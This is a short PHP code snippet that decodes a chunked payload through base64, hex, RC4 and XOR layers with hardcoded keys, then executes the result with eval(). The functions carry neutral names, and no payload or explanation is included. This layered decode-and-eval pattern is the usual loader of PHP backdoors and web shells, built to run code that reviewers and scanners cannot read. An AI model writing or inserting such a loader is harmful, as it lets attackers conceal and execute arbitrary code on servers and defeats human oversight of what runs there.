function externalDecodeMethod($chunks) {
    $hex = implode("", array_map('base64_decode', $chunks));

    $xorData = "fixedXORKey123";
    $rc4Data = "fixedRC4Key12345";

    $xorDecrypted = "";
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $xorDecrypted .= chr(hexdec(substr($hex, $i, 2)));
    }

    $rc4Decrypted = rc4Decrypt($rc4Data, $xorDecrypted);

    $decoded = "";
    for ($i = 0; $i < strlen($rc4Decrypted); $i++) {
        $decoded .= chr(ord($rc4Decrypted[$i]) ^ ord($xorData[$i % strlen($xorData)]));
    }

    eval(base64_decode($decoded));
}

function rc4Decrypt($key, $str) {
    $s = range(0, 255);
    $j = 0;
    for ($i = 0; $i < 256; $i++) {
        $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
        $tmp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $tmp;
    }

    $i = $j = 0;
    $res = "";
    for ($y = 0; $y < strlen($str); $y++) {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $tmp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $tmp;
        $res .= chr(ord($str[$y]) ^ $s[($s[$i] + $s[$j]) % 256]);
    }
    return $res;
}